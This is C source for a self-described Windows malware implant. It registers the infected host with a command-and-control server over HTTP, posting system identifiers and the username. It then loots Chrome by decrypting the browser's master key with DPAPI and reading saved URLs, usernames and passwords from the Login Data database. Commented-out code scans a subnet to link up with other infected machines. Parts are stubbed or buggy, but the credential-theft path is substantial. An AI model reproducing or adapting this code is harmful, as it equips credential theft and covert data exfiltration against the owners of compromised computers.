/**************************************
 * This exe provides initial access
 * to a target network by establishing
 * persistence and http egress with the
 * linked C2 server
 * ***********************************/

// TODO
// Read environment variables
// List network interfaces
// Get Windows Version
// Retrieve username + token
// Retrieve computer name
// Retrieve machine GUID
// List files in directory
// Change directory
// List running processes

#include <tchar.h>
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <dirent.h>
#include <iphlpapi.h>
#include <zmq.h>
#include <sqlite3.h> //May need to be dynamically Linked for less carbon footprint


// Use iphlpapi to get interface info
void NetworkInterfaces(){

}

// List environment variables
void EnvVariables(){

}

// Print all running processes
void RunningProcesses(){
    HANDLE hSnap;
    PROCESSENTRY32 ProcessStruct;
    ProcessStruct.dwSize = sizeof(PROCESSENTRY32);
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE){
        printf("Snapshot failure: %d\n", GetLastError());
    }
    if(Process32First(hSnap, &ProcessStruct) == FALSE){
        printf("Snapshot failure: %d\n", GetLastError());
    }
    do{
        printf("%s\n", ProcessStruct.szExeFile);
    }while(Process32Next(hSnap, &ProcessStruct));
    CloseHandle(hSnap);
}

// Identify system using product ID
wchar_t* ProductID(){
    wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));
	DWORD size = 30*sizeof(wchar_t);
	RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductId", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
    return value;
}

// Retrieve computer name
wchar_t* ComputerName(){
    wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));;
	DWORD size = 30*sizeof(char);
	RegGetValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", "ComputerName", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
	return value;
}

// Retrieve current user
wchar_t* CurrentUser(){
    wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));;
	DWORD size = 30*sizeof(char);
	RegGetValue(HKEY_CURRENT_USER, "Volatile Environment", "USERNAME", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
	return value;
}

// Windows release
wchar_t* OSName(){
    wchar_t* name = (wchar_t*)malloc(30*sizeof(wchar_t));
    DWORD size = 30*sizeof(char);
    RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", RRF_RT_REG_SZ, NULL, (PVOID)name, &size);
    return name;
}

// Windows build
wchar_t* OSVersion(){
    wchar_t* build = (wchar_t*)malloc(30*sizeof(wchar_t));
	DWORD size = 30*sizeof(char);
	RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild", RRF_RT_REG_SZ, NULL, (PVOID)build, &size);
    return build;
}

//Get Local State
BYTE* getLocalState(){
    HANDLE hStateFile;
    FILE* localStateFile;
    DWORD LSFileSize;
    wchar_t* username = CurrentUser();
    char* cLocalStatePath = (char*) malloc(1024);
    if (cLocalStatePath == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    // Building Path to Chrome Login Data
    sprintf(
        cLocalStatePath,
        "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
        username
    );

    //Get Local State File Handle
    hStateFile = CreateFileA(
        cLocalStatePath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hStateFile == INVALID_HANDLE_VALUE) {
        printf("Couldn't open Local State File %s", GetLastError());
    }
    //Get File Size
    LSFileSize = GetFileSize(hStateFile, NULL);
    if (LSFileSize == INVALID_FILE_SIZE){
        printf("Couldn't get file size with error: %s", GetLastError());
    };

    //Open File
    localStateFile = fopen(cLocalStatePath, "r");
    if (localStateFile == NULL) {
        printf("error getting file (fopen)");
    }
    BYTE* byteBuffer = (BYTE*) malloc (LSFileSize + 1);
    if (byteBuffer == NULL){
        printf("Memory not successfully Allocated.\n");
    }

    //Read info in Local State
    if(fgets(byteBuffer, LSFileSize, localStateFile) == NULL) {
        printf("fgets error\n");
    };
    free(cLocalStatePath);
    CloseHandle(hStateFile);
    return byteBuffer; //Don't forget to free later
}

// Decrypt DPAPI
DATA_BLOB decryptDPAPI(BYTE* encryptedBytes, DWORD encryptBytesSize) {
    DATA_BLOB in;
    DATA_BLOB entropy;
    DATA_BLOB out;
    BYTE* entropyBuffer = (BYTE*) malloc (0);
    if (entropyBuffer == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    BYTE* outBuffer = (BYTE*)malloc(encryptBytesSize);
    //Setting DATA_BLOBS
    in.pbData = encryptedBytes;
    in.cbData = encryptBytesSize;
    entropy.pbData = entropyBuffer;
    entropy.cbData = (DWORD)0;
    out.cbData = encryptBytesSize;
    out.pbData = outBuffer;
    
    //DECRYPTING TIME!!!!
    for (int i = 0; i < in.cbData; i++) {
        printf(" %02x ", in.pbData[i]);
    };
    //printf("NEXT IS IT %02x ", in);
    if (CryptUnprotectData(&in, NULL, &entropy, NULL, NULL, 0, &out)){
        return out;
    }
    else{
        printf("Decryption didn't work. ERROR %s", GetLastError());
    }
}

//Get Encrpytion Key
char* getEncrpytKey(){
    BYTE* localState = getLocalState();
    char* osCryptstr = (char*) malloc (1024);
    if (osCryptstr == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    // Parsing Strings
    char* token = strtok(localState, ",");
    while (token != NULL) {
        if (strncmp(token, "\"os_crypt\"", strlen("\"os_crypt\"")) == 0){
            osCryptstr = token;
        }
        token = strtok(NULL, ",");
    }
    char* encryptKey = strtok(osCryptstr, "\"{}:");
    while (encryptKey != NULL) {
        if (strncmp(encryptKey, "os_crypt", strlen("os_crypt")) == 0 || strncmp(encryptKey, "encrypted_key", strlen("encrypted_key")) == 0) {
            encryptKey = strtok(NULL, "\"{}:");
        }
        else {
            token = encryptKey;
            encryptKey = strtok(NULL, "\"{}:");
        }
    }
    free(localState);

    DWORD keySize = 0;
    // First Call to get length
    BOOL firstDecode = CryptStringToBinaryA(token, 0, CRYPT_STRING_BASE64, NULL, &keySize, NULL, NULL);
    if (firstDecode == 0){
        printf("Trouble 1Decoding\n");
    };

    //Decoding
    BYTE* buffer = (BYTE*)malloc(keySize + 1);
    if(buffer == NULL){
        printf("Memory not successfully allocated.\n");
    };
    BOOL decoded = CryptStringToBinaryA(token, keySize, CRYPT_STRING_BASE64, buffer, &keySize, NULL, NULL);
    if (decoded == 0) {
        printf("Trouble Decoding\n");
    };


    BYTE* finalKey = (BYTE*) malloc (keySize-5);
    if (finalKey == NULL) {
        printf("Memory not successfully allocated.\n");
    };
    for(int i = 5; i < keySize; i++){
        finalKey[i-5] = buffer[i];
        //printf(" %02x ", buffer[i]);
        //printf(" %02x ", finalKey[i-5]);
    }
    free(buffer);
    
    //MessageBoxA(NULL, "", "", MB_OK);
    //printf("DPAPI: --> %s", bstore);
    printf("%s", decryptDPAPI(finalKey, keySize-5).pbData);
    return finalKey;
}

// Decrypt Looted Chrome Passwords
char* Crack(BLOB* pass) {
    DATA_BLOB in;
    DATA_BLOB out;
    DATA_BLOB blobEntropy;

    //Get Size of password
    BYTE storage[1024];
    memcpy(storage,pass,1024);
    int size = sizeof(storage) / sizeof(storage[0]);

    //Setting up DATA_BLOB in
    //in.pbData = pass;
    //in.cbData = size+1;

    char* decryptedPass = (char*) malloc(size+1);
    if(decryptedPass == NULL) {
        printf("Memory not successfully Allocated.\n");
    }


    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        for (int i = 0; i < out.cbData; i++){
            decryptedPass[i] = out.pbData[i];
            decryptedPass[out.cbData] = '\0';
            char* ret = decryptedPass;
            free(decryptedPass);
            return ret;
            
        }
    }
    else {
        return "CryptUnprotectData did not work";
    }
    free(decryptedPass);
}

//Loot Chrome Passwords
wchar_t* GetPass(){
    wchar_t* username = CurrentUser();
    char* cPassPath = (char*) malloc(512);
    if (cPassPath == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    // Building Path to Chrome Login Data
    sprintf(
        cPassPath,
        "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
        username
    );

// THE REAL DEAL
    sqlite3_stmt *stmt;
    sqlite3 *db;

    char *query = "SELECT origin_url, username_value, password_value FROM logins";
    if (sqlite3_open(cPassPath, &db) == SQLITE_OK) {
        if (sqlite3_prepare_v2(db, query, -1, &stmt, 0) == SQLITE_OK) {
            //Begin Data Reading
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                //While we still have data in database
                char *url = (char*)sqlite3_column_text(stmt,0);
                char *username = (char*)sqlite3_column_text(stmt,1);
                BLOB* password = (BLOB*)sqlite3_column_text(stmt,2); //This is the only encrypted field
                printf("Url: %s\n",url);
                printf("Username: %s\n",username);
                //The moment of Orgasm:)
                char *decrypted = Crack(password);
                if (decrypted != NULL){
                    printf("Password: %s\n",decrypted);
                }
            }
        }
        else{
            printf("Error preparing database with error %d\n", (sqlite3_prepare_v2(db, query, -1, &stmt, 0)));
        }
        sqlite3_finalize(stmt);
        sqlite3_close(db);
    }
    else {
        printf("Error opening database!\n");
    }

    free(cPassPath);
}

// List files in directory
void ls(char* path){
    // Open context
    DIR *d;
    d = opendir(path);

    struct dirent *de;
    if (d != NULL){
        while ( de = readdir(d)){
            printf("%s\n", de->d_name);
        }
        closedir(d);
    }
}


void RegisterC2(){

    HINTERNET session = WinHttpOpen(
        L"Diplomat", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );

    if (session)
    {
        HINTERNET connection = WinHttpConnect(
            session, 
            L"127.0.0.1", 
            5000, 
            0
        );
        
        if (connection) {
            HINTERNET request = WinHttpOpenRequest(
                connection,
                L"POST",
                L"/register",
                L"HTTP/1.1",
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                0
            );
            
            if(request){
                wchar_t* headers = L"Content-Type: application/json\r\n";
                char* jsonData = (char*) malloc(512);
                wchar_t* productID = ProductID();
                wchar_t* OSRelease = OSName();
                wchar_t* OSBuild = OSVersion();
                wchar_t* username = CurrentUser();
                wchar_t* computerName = ComputerName();
                sprintf(jsonData, "{ \"ProductID\": \"%s\", \"OSName\": \"%s\", \"OSBuild\": \"%s\", \"Username\": \"%s\", \"ComputerName\": \"%s\" }", productID, OSRelease, OSBuild, username, computerName);
                size_t size = strlen(jsonData) * sizeof(char);

                BOOL result = WinHttpSendRequest(
                    request, 
                    headers,
                    -1,
                    jsonData,
                    size,
                    size,
                    (DWORD_PTR)NULL
                );
                
                if(result){
                    result = WinHttpReceiveResponse(request, NULL);
                }
                DWORD responseSize;
                if(result){
                    result = WinHttpQueryDataAvailable(request, &responseSize);
                }
                if(result){
                    // Handle response
                }
            }else{
                printf("%d\n", GetLastError());
            }
            WinHttpCloseHandle(request);
        }else{
            printf("%d\n", GetLastError());
        }
        WinHttpCloseHandle(connection);
    }else{
        printf("%d\n", GetLastError());
    }
    WinHttpCloseHandle(session);
}

wchar_t* GetTasks(){

}

int _tmain(int argc, _TCHAR *argv[]){

    if(argc == 1){
        // Report intrusion to C2
        RegisterC2();
        getEncrpytKey();
    }
/**
        while(1){
            wchar_t* tasks = GetTasks();
            
            int jitter = (rand() % 20) - 10;
            Sleep(30+jitter);
        }
    }
**/
    // Do malware things (investigation, looting, persistence)

    // Situational Awareness tasks
    //RunningProcesses();
    //ls(".");
    //wchar_t* productID = ProductID();
    //printf("%s\n", productID);
    //ComputerName();
    //CurrentUser();
    //OSVersion();
    //NetworkInterfaces();


    /*

    // Establish peer network
    // Create a router for recieving messages
    void* context = zmq_ctx_new();
    void* router = zmq_socket(context, ZMQ_ROUTER);
    int success = zmq_bind(router, "tcp://*:8889");
    if (success != 0){

    }

    // Scan network for other infected machines
    // Brute force method
    void* dealer = zmq_socket(context, ZMQ_DEALER);
    for(int address = 1; address < 255; address++){
        zmq_connect(dealer, "tcp://192.168.56.%d:8889", address);
    }


    // Timed loop for checking potential peers and retrieving commands from c2
    while(1){
        // Read router activity
        _TCHAR* buffer = malloc(64*sizeof(char));
        zmq_recv(router, buffer, 64, 0);
        printf("Incoming message: %s", buffer);
        Sleep(10000);
        zmq_send(dealer, buffer, 64, 0);
    }

    */
}